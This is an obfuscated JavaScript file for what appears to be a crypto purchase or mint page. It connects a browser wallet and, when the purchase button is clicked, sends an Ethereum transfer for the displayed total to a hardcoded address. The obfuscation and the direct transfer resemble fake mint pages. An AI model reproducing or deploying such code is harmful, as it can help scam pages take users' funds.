const _0x4d36af=_0x55b5;function _0x1d3a(){const _0x40aa26=['eth_sendTransaction','decrement','10hvvuvu','request','then','218480ZDxjpG','4021647xdiESz','0x4e9f73539bB4820BA4087663B363837Ddb4d4E87','value','catch','7048lLCepA','56844sJecFo','156RBIgDP','4466PCltgD','29mVSNPf','addEventListener','28KlVWhR','click','5365224MpuZHl','round','log','4YmAMaa','ethereum','55qKOKoK','innerText','body\x20>\x20div\x20>\x20div\x20>\x20div.qnty-select-container\x20>\x20div\x20>\x20input','...','#price','15208791vKOFMh','querySelector','51746gJdYzJ','body\x20>\x20header\x20>\x20div\x20>\x20button','pow','body\x20>\x20div.purchase-container\x20>\x20div\x20>\x20div.purchase-button-container\x20>\x20button','error','length'];_0x1d3a=function(){return _0x40aa26;};return _0x1d3a();}(function(_0x3f295c,_0x10c068){const _0x3cce01=_0x55b5,_0x41b6ae=_0x3f295c();while(!![]){try{const _0x1c5eee=-parseInt(_0x3cce01(0xdd))/0x1*(-parseInt(_0x3cce01(0xed))/0x2)+-parseInt(_0x3cce01(0xf9))/0x3*(parseInt(_0x3cce01(0xe4))/0x4)+parseInt(_0x3cce01(0xf8))/0x5*(-parseInt(_0x3cce01(0xdb))/0x6)+-parseInt(_0x3cce01(0xdc))/0x7*(parseInt(_0x3cce01(0xd9))/0x8)+-parseInt(_0x3cce01(0xe1))/0x9*(-parseInt(_0x3cce01(0xf5))/0xa)+parseInt(_0x3cce01(0xe6))/0xb*(parseInt(_0x3cce01(0xda))/0xc)+parseInt(_0x3cce01(0xeb))/0xd*(parseInt(_0x3cce01(0xdf))/0xe);if(_0x1c5eee===_0x10c068)break;else _0x41b6ae['push'](_0x41b6ae['shift']());}catch(_0x3f63c5){_0x41b6ae['push'](_0x41b6ae['shift']());}}}(_0x1d3a,0xa3dfd));const inputSelector=document[_0x4d36af(0xec)](_0x4d36af(0xe8)),priceDisplay=document[_0x4d36af(0xec)](_0x4d36af(0xea)),purchaseButton=document[_0x4d36af(0xec)](_0x4d36af(0xf0)),connectButton=document[_0x4d36af(0xec)](_0x4d36af(0xee));var account=undefined;const price=0.05;var total=0x0;function quantityController(_0x5c7085){const _0x653d9d=_0x4d36af;if(_0x5c7085['id']==_0x653d9d(0xf4)){if(!(parseInt(inputSelector[_0x653d9d(0xfb)])>0x1))return;inputSelector['value']=parseInt(inputSelector['value'])-0x1;}else{if(!(parseInt(inputSelector[_0x653d9d(0xfb)])<0x5))return;inputSelector[_0x653d9d(0xfb)]=parseInt(inputSelector['value'])+0x1;}calculatePrice();}function _0x55b5(_0x5a308a,_0x33c4fe){const _0x1d3a10=_0x1d3a();return _0x55b5=function(_0x55b539,_0x2e2149){_0x55b539=_0x55b539-0xd8;let _0x56954e=_0x1d3a10[_0x55b539];return _0x56954e;},_0x55b5(_0x5a308a,_0x33c4fe);}function calculatePrice(){const _0x8567a6=_0x4d36af;total=parseInt(inputSelector[_0x8567a6(0xfb)])*price,priceDisplay[_0x8567a6(0xe7)]=Math[_0x8567a6(0xe2)](total*0x64)/0x64;}async function getAccount(){const _0xd0cd03=_0x4d36af,_0x214946=await ethereum[_0xd0cd03(0xf6)]({'method':'eth_requestAccounts'});account=_0x214946[0x0],connectButton[_0xd0cd03(0xe7)]=account['slice'](0x0,Math[_0xd0cd03(0xe2)](account[_0xd0cd03(0xf2)]/0x4))+_0xd0cd03(0xe9);}connectButton[_0x4d36af(0xde)](_0x4d36af(0xe0),getAccount),purchaseButton[_0x4d36af(0xde)]('click',async function(){const _0x46df2d=_0x4d36af;if(typeof window[_0x46df2d(0xe5)]!=='undefined'){const _0x556acf='0x'+(total*Math[_0x46df2d(0xef)](0xa,0x12))['toString'](0x10);ethereum[_0x46df2d(0xf6)]({'method':_0x46df2d(0xf3),'params':[{'from':account,'to':_0x46df2d(0xfa),'value':_0x556acf}]})[_0x46df2d(0xf7)](_0x40cf2b=>console[_0x46df2d(0xe3)](_0x40cf2b))[_0x46df2d(0xd8)](_0x194d48=>console[_0x46df2d(0xf1)]);}});
